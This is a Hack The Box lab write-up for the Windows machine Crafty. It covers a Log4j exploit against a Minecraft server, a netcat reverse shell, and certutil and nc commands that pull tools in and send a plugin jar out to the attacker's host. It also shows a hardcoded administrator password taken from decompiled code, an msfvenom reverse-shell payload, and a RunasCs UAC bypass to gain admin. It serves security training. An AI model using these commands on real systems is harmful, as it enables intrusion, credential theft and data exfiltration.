+++
title = "HTB: Crafty"
date = 2024-06-12T21:19:39-05:00
draft = false
toc = true
images = ['/images/HTB-Crafty/Crafty.png']
tags = ['Hack The Box']
categories = ['Writeups']
+++

* Platform: Hack The Box
* Link: [Crafty](https://app.hackthebox.com/machines/Crafty)
* Level: Easy
* OS: Windows
---

Target IP - `10.10.11.249`


# Scanning 

```
sudo nmap -sC -sV -p- -T5 -oA nmap/Crafty 10.10.11.249
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-26 13:56 CST
Nmap scan report for crafty.htb (10.10.11.249)
Host is up (0.054s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
|_http-title: Crafty - Official Website
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.62 seconds
```

We find two open ports:
* 80 running HTTP
* 25565 running a Minecraft server with version 1.16.5

Even though there is no redirection let's add `crafty.htb` to our hosts file.

```
sudo echo "10.10.11.249 crafty.htb" | sudo tee -a /etc/hosts
```

When we go to the website we find a web page about a game called Crafty.

![Crafty website](/images/HTB-Crafty/crafty-webpage.png)

There is nothing interesting on the web application so far. I turned my attention to the Minecraft server. I google `minecraft 1.16.5 vulnerability` and found that there is a Log4j exploit for it with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

![Minecraft Log4j exploit](/images/HTB-Crafty/log4j-Minecraft.png)

We then find a PoC for the exploit at this [Github repo](https://github.com/kozmer/log4j-shell-poc?source=post_page-----316a735a306d--------------------------------).

After checking the content of `poc.py` I see that it is using `String cmd="/bin/sh";` which will not work on Windows. I asked ChatGPT to make it Windows compatible and it changed it to `String cmd="cmd.exe";`.

![Log4j PoC content](/images/HTB-Crafty/log4j-poc-content.png)

![Log4j PoC content change](/images/HTB-Crafty/poc-python-change.png)

On the exploit page, you can read: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."

Going to the official website provided on the Github page we need to create an account. After searching around we found some java archives on https://repo.huaweicloud.com/java/

For a quick download and setup use the commands below

```
#Make sure to download it in the log4j-shell-poc directory
wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz

tar -xf jdk-8u181-linux-x64.tar.gz

#Rename the file
mv jdk1.8.0_181 jdk1.8.0_20
```

Now here are all our files.

![Log4j PoC files](/images/HTB-Crafty/log4j-poc-files.png)

We need a way to communicate with the Minecraft server. I found this tool named [pyCraft](https://github.com/ammaraskar/pyCraft).

We need to setup a virtual environment for pyCraft.

```
virtualenv ENV

source ENV/bin/activate

pip install -r requirements.txt
```

![PyCraft setup](/images/HTB-Crafty/pyCraft-setup.png)

Now we setup a listener to catch the shell.

```
rlwrap nc -lvnp 4444
```

Then we start the log4j exploit. 

```
python3 poc.py --userip 10.10.14.222 --webport 80 --lport 4444
```

![Log4j exploit launch](/images/HTB-Crafty/log4j-exploit-launch.png)

From the pyCraft folder we run `start.py`

```
pip install -r requirements.txt

python3 start.py
```

![PyCraft Link](/images/HTB-Crafty/pyCraft-link.png)

After you see the `Connected.` message with pyCraft you have to copy the link provided on the `Send me:` line in `log4j-shell-poc`, paste it in pyCraft then press `Enter` and you will catch a shell on your listener.

![svc_minecraft shell](/images/HTB-Crafty/shell-minecraft.png)

The user flag is on the user desktop.

![Crafty user flag](/images/HTB-Crafty/crafty-user-flag.png)

Go to `c:\Users\svc_minecraft\server\plugins\` and you will find a `playercounter-1.0-SNAPSHOT.jar` file. 

To send that file to my Kali machine I used `nc.exe` (Netcat for Windows)

1. We download `nc.exe` with 

```
wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
```

2. Move into the `netcat-1.11` directory created after the extraction

3. Start a Python server

```
python3 -m http.server
```

4. Back on my reverse shell I used the command below to download `nc.exe`

```
certutil.exe -urlcache -split -f http://IP:PORT/nc.exe nc.exe
```

![netcat upload on target](/images/HTB-Crafty/nc.exe-ontarget.png)

5. I setup a listener on my Kali machine with 

```
nc -nlp 1235 > playercounter-1.0-SNAPSHOT.jar
```

6. On the target I run 

```
.\nc.exe 10.10.14.222 1235 < c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar
```

![Crafty archive exfiltration](/images/HTB-Crafty/archive-exfiltration.png)

The `playercounter-1.0-SNAPSHOT.jar` archive is now on my Kali machine. You have to stop the listener to regain control of your terminal on the target system.

After extracting the archive, we get `Playercounter.class` in `/htb/crafty/playercounter/`. I used [decompiler.com](https://www.decompiler.com/) to decompile the file.

> A `.class` file is a compiled Java bytecode file. When you compile a Java source code file (`.java`), the Java compiler (`javac`) translates the human-readable Java code into a platform-independent bytecode format. This bytecode is then stored in `.class` files.
> In the case `Playercounter.class` contains the compiled bytecode for the `Playercounter` Java class

We find what looks like some credential (`s67u84zKq8IXw`) used when connecting to a service on port 27015 (typically used by online games). 

![archive content credentials](/images/HTB-Crafty/playercount-file.png)

We have a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that enables us to execute processes with permissions different from our current ones. Our objective is to launch an Administrator shell from the current user `svc_minecraft`.

Let's generate a payload with `msfvenom`.

**Example**

```
msfvenom -p windows/x64/shell_reverse_tcp lhost=<YOUR IP ADDRESS> lport=<PORT NUMBER> -f exe -a x64 --platform windows -o shell.exe
```

Transfer `shell.exe` and `RunasCs.exe` to the target with the same method used for `nc.exe`.

![malicious file and runascs.exe on target](/images/HTB-Crafty/files-on-target.png)

Setup another listener on the port you selected for your `msfvenom` payload.

```
rlwrap -cAr nc -lvp 8010
```

Use `runasCs` in conjunction with your payload on the target.

```
.\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
```

You get an administrative shell on your new listener.

![admin shell](/images/HTB-Crafty/admin-shell.png)

At `C:\Users\Administrator\Desktop` we find `root.txt`.

![root flag](/images/HTB-Crafty/root-flag.png)






















